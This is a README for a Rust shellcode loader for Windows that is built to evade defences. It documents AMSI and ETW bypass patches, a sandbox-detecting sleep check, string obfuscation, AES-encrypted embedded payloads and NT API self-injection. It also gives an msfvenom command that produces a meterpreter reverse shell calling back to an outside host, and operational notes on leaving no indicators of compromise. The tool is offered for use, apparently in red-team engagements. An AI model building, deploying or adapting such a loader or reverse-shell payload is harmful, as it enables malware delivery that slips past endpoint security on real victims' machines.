# FiveDeez

A Rust shellcode loader for Windows x64, cross-compiled from Linux using the
MinGW-w64 toolchain — no Windows machine or Docker required.

---

## Features

| Feature | Detail |
|---|---|
| Execution | Self-injection via NT API (`NtAllocateVirtualMemory` / `NtProtectVirtualMemory` / `NtCreateThreadEx`) — no kernel32 wrappers |
| Memory | RW alloc → copy → flip to RX before execution (no RWX pages) |
| Encryption | AES-256-GCM with a freshly generated random key/nonce per build |
| AMSI bypass | `AmsiScanBuffer` ret-0 patch (in-process) |
| ETW bypass | `EtwEventWrite` ret-0 patch (in-process) |
| Sleep jitter | Random 30–90 s pre-execution delay via `NtDelayExecution` |
| Sandbox detection | Sleep-compression check — aborts silently if time is accelerated |
| String obfuscation | All Win32 string literals obfuscated at compile time via `obfstr` |
| Binary hardening | Symbols stripped, LTO, `opt-level=z`, `panic=abort` |

---

## Prerequisites

### 1. Rust toolchain

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env          # activate for current session
echo 'source "$HOME/.cargo/env"' >> ~/.bashrc   # activate for future sessions
```

### 2. Windows x64 cross-compilation target

```bash
rustup target add x86_64-pc-windows-gnu
```

### 3. MinGW-w64 linker (Ubuntu / Debian)

```bash
sudo apt install gcc-mingw-w64-x86-64
```

### 4. OpenSSL (key generation — ships with Ubuntu by default)

```bash
sudo apt install openssl
```

---

## Project Structure

```
FiveDeez/
├── prepare.sh                    ← build script (use this)
├── Cargo.toml                    ← workspace manifest + release profile
├── Cross.toml                    ← cargo-cross config (optional, requires Docker)
├── .cargo/config.toml            ← MinGW-w64 linker config
├── encrypt_payload/              ← standalone encryption helper (CLI tool)
│   ├── Cargo.toml
│   └── src/main.rs
└── src/
    ├── main.rs                   ← entrypoint / orchestration
    ├── shellcode.rs              ← generated KEY + NONCE (auto-patched by prepare.sh)
    ├── payload.bin               ← encrypted payload (written + wiped by prepare.sh)
    ├── crypto.rs                 ← embeds payload.bin via include_bytes!, AES-256-GCM decrypt
    ├── loader.rs                 ← NT API shellcode execution
    ├── timing.rs                 ← sleep jitter + sandbox check
    └── bypass/
        ├── mod.rs
        ├── amsi.rs               ← AMSI patch
        └── etw.rs                ← ETW patch
```

---

## Usage

`prepare.sh` handles everything in a single command: generates fresh AES-256
keys, encrypts your shellcode, embeds it in the binary, and produces a single
self-contained `.exe`.

```bash
./prepare.sh -i <shellcode.bin> [-o <output_name>] [--debug]
```

| Flag | Description |
|---|---|
| `-i <file>` | Raw shellcode input file **(required)** |
| `-o <name>` | Output filename without `.exe` extension (default: `fivedeez`) |
| `--debug` | Debug build (no optimisations, symbols kept) |

**Example:**

```bash
# Generate shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.10 LPORT=4444 -f raw -o beacon.bin

# Build the loader — single self-contained .exe, fresh keys every run
./prepare.sh -i beacon.bin -o engagementX

# Output: engagementX.exe
```

The encrypted payload is embedded directly into the binary at link time via
`include_bytes!` — no separate file to deploy. Every invocation generates a
unique key, nonce, and ciphertext.

---

## Execution Flow

When `fivedeez.exe` runs on the target:

```
1. ETW bypass       NtDll!EtwEventWrite patched → ret 0
2. AMSI bypass      Amsi!AmsiScanBuffer patched → ret 0
3. Sleep jitter     NtDelayExecution (30–90 s random)
4. Sandbox check    Sleep compression detected → silent exit
5. Decrypt          AES-256-GCM decrypt embedded shellcode blob
6. Execute          NtAllocateVirtualMemory (RW) → copy → NtProtectVirtualMemory (RX)
                    → NtCreateThreadEx → NtWaitForSingleObject
```

---

## Tuning

Timing constants can be adjusted before building in `src/main.rs`:

```rust
const SLEEP_BASE_MS:      u64 = 30_000;  // minimum pre-exec sleep (30 s)
const SLEEP_JITTER_MS:    u64 = 60_000;  // max additional jitter  (60 s)
const SLEEP_COMPRESS_MS:  u64 = 10_000;  // sandbox check sleep    (10 s)
const SLEEP_TOLERANCE_MS: u64 =  5_000;  // early-wake tolerance   ( 5 s)
```

Set `SLEEP_BASE_MS=0` and `SLEEP_JITTER_MS=0` during development to skip the
sleep entirely.

---

## Operational Notes

- **Single file deploy** — the encrypted payload is embedded at link time via `include_bytes!`; only the `.exe` needs to be transferred to the target.
- **Key never touches disk** — the AES-256 key and nonce are baked into the `.exe` at compile time; `src/payload.bin` is truncated back to empty immediately after the build.
- **`src/shellcode.rs` is auto-patched** by `prepare.sh` and restored to an inert placeholder on exit — no key material ever lingers in the source tree.
- **No plaintext IOCs** — DLL/function name strings are obfuscated at compile time via `obfstr` and decoded on the stack at runtime.
- **`.exe` outputs and raw shellcode files are gitignored** — they should never be committed.

---

## Dependencies

| Crate | Purpose |
|---|---|
| `aes-gcm 0.10` | AES-256-GCM authenticated encryption (pure Rust) |
| `obfstr 0.4` | Compile-time string literal obfuscation |
| `windows-sys 0.52` | NT/Win32 API bindings |
